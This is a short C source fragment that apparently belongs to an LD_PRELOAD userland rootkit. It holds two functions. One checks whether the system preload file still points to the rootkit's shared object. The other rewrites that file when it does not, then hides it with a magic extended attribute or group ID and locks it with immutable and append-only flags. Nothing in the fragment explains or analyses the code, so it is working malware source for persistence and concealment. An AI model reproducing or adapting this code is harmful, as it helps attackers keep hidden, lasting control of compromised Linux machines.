int preloadok(const bdvcfg_t *bc){ // returns 1 if preloadpath is ok.
    hook(C__XSTAT);
    struct stat preloadstat;
    memset(&preloadstat, 0, sizeof(struct stat));
    int statret = (long)call(C__XSTAT, _STAT_VER, bc->preloadpath, &preloadstat);

    char *sopath = rksopath(bc->installdir, bc->bdvlso);
    if(!sopath) return 1;
    int status = 1;
    if((statret < 0 && errno == ENOENT) || preloadstat.st_size != (off_t)strlen(sopath))
        status = 0;
    clean(sopath);

    if(status != 0){
        doiapath(bc->preloadpath, 0);
#ifdef USE_MAGIC_ATTR
        attrmodif(bc->preloadpath, CSETXATTR);
#else
        chownpath(bc->preloadpath, bc->magicid);
#endif
        while(!doiapath(bc->preloadpath, 1));
    }
    return status;
}

void reinstall(const bdvcfg_t *bc){
    if(preloadok(bc))
        return;

    char *sopath = rksopath(bc->installdir, bc->bdvlso);
    if(!sopath) return;

    doiapath(bc->preloadpath, 0);

    hook(CFOPEN, CFWRITE);
    FILE *ldfp = call(CFOPEN, bc->preloadpath, "w");
    if(ldfp != NULL){
        call(CFWRITE, sopath, 1, strlen(sopath), ldfp);
        fflush(ldfp);
        fclose(ldfp);
#ifdef USE_MAGIC_ATTR
        attrmodif(bc->preloadpath, CSETXATTR);
#else
        chownpath(bc->preloadpath, bc->magicid);
#endif
    }
    clean(sopath);
    while(!doiapath(bc->preloadpath, 1));
}
